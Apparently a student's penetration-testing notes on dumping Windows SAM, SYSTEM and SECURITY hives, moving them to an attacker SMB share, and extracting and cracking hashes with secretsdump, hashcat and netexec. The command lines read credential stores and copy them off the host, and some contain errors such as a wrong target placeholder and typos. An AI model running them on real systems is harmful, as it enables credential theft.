 - With administrative access to a Windows System, can attempt to quickly dump the files associated with the ==`SAM`== database, and begin cracking the hashes offline.

## Registry hives:

- These are three ==`registry hives`== which can copy if have a local administrative access to a target system
- each one of them serving a specific purpose when it comes to dumping and cracking password hashes.
	

| Registry Hive   | Description                                                                                                                                                                         |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext password.                                                           |
| `HKLM\SYSTEM`   | Stores the `system boot key` which is used to encrypt the SAM database. The key is required to decrypt the databases.                                                               |
| `HKLM\SECURITY` | Contains sensitive information used by ==`LSA (Local Security Authority)`==, including cached ==`Domain Credentials(DCC2)`==, ==`cleartext passwords`==, ==`DPAPI keys`== and more. |
- can backup these hives using the ==`reg.exe`== utility.
		```C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
			The operation completed successfully
		C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
			The operation completed successfully
		C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
		```
- ###### To share the Registry hives to the attacker machine:
	
	- #### Use smbserver to share the Registry Hives:
		
		-  To create the share:
			- simply run ==`smbserver.py -smb2support`==  specify a name for the share`(e.g CompData)`
			- Point it to the local directory on the attacker machine.
			- The ==`-smbsupport`== 
			- Command:
				- `python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <dir_name> <local_directory>`
			- This might fail for modern windows system because the SMBv1 is disabled by default due to  [numerous severe vulnerabilities](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1).
	
	- #### Moving hive copies to share:
		
		- Use this command in target machine to move the Registry hive:
			- `move sam.save \\<target_ip>\<dir_name>`
			- `move security.save  \\<target_ip>\<dir_name>`
			- `move system.save  \\<target_ip>\<dir_name>`

## Dumping hashes with secretsdump:

- For dumping hashes offline is ==`Impacket's secretsdump`==  is a useful tool.
- Impacket is included in most modern penetration testing distributions.
- Command:
	- use ==`locate`== command to locate ==`secretsdump`== in linux:
		- `locate secretsdump`
	
- Run the script with python and specify each of the hive files that have been retrieved from the target:
- Command:
	- `python3 /usr/share/doc/python3-impacket/example/secretsdump.py -sam sam.save  -security securoty.save -system system.save LOCAL`

- ##### Cracking hashes with Hashes:
	- Once getting all the hashes from ==`impacket's seretsdump`== copy them and save it in a file with extension .txt and use `hashcat` to crack the files.


## DCC2 hashes:

- ==`hklm\security`== contains cached domains logon information, in the form of DCC2 hashes.
- These are local, hashed copies of network credential hashes.
- This hashes are much more difficult to crack than a NT hash, as it used `PBKDF2`.
	- It cannot be used for lateral movement.
	- Hashcat mode for cracking DCC2 is ==`2100`==.
	- Command:
		- `hashcat -m 2100 '$DCC2$<hash_value>' /usr/share/wordlists/rockyou.txt`


## DPAPI:

- The ==`Data Protection Application Programming Interface`==, or ==`DPAPI`== were also dumped from ==`hklm\security`==
- The DPAPI, is a set of APIs in Windows Operating systems used to encrypt and decrypt data blobs on a per-user basis.
- Example of DPAPI and how they work:



| Applications              | Use of DPAPI                                                                                |
| ------------------------- | ------------------------------------------------------------------------------------------- |
| Internet Explorer         | Password form auto-completion data(username and password for saved sites)                   |
| Google Chrome             | Password form auto-completion data(username and password for saved sites)                   |
| Outlook                   | Passwords for email accounts                                                                |
| Remote Desktop Connection | Saved credentials for connections to remote machines                                        |
| Credential Manager        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |
- DPAPI encrypted credentials can be decrypted manually with tools like Impacket's:
	-  [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py)
	- [mimikatz](https://github.com/gentilkiwi/mimikatz)
	- remotely with [DonPAPI](https://github.com/login-securite/DonPAPI)

## Remote dumping & LSA secrets considerations:

- With access to credential that have `Local administrator privileges`, it is also possible to target ==`LSA`== secrets over the network.
- This may allow to extract credentials from running services, schedule tasks or applications that passwords using ==`LSA`==.

- ##### Dumping LSA secrets remotely: 
	- Command:
		- `netexec smb <target_ip> --local-auth -u <user_name> -p <pass_word> --lsa`

- ##### Dumping SAM remotely:
	- Command:
		- `netexec smb <target_ip> --local-auth -u <user_name> -p <pass_word> --sam`

[[Introduction to Password Attacks]]